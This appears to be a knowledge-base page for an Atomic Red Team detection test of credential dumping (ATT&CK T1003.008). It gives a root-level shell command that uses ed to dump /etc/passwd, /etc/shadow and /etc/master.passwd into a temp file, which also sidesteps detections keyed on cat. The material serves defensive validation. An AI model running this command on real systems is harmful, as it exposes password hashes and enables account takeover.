---
atomic_guid: "df1a55ae-019d-4120-bc35-94f4bc5c4b0a"
title: "Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.008"
attack_technique_name: "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.008/T1003.008.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "df1a55ae-019d-4120-bc35-94f4bc5c4b0a"
  - "Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat

Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed

## Metadata

- Atomic GUID: df1a55ae-019d-4120-bc35-94f4bc5c4b0a
- Technique: T1003.008: OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow
- Platforms: linux
- Executor: sh
- Elevation Required: True
- Source Path: atomics/T1003.008/T1003.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.008]]

## Input Arguments

### output_file

- description: Path where captured results will be placed
- type: path
- default: /tmp/T1003.008.txt

## Executor

- elevation_required: True
- name: sh

### Command

```bash
unamestr=$(uname)
if [ "$unamestr" = 'Linux' ]; then echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > #{output_file}; elif [ "$unamestr" = 'FreeBSD' ]; then echo -e "e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n" | ed > #{output_file}; fi
```

### Cleanup

```bash
rm -f #{output_file}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.008/T1003.008.yaml)
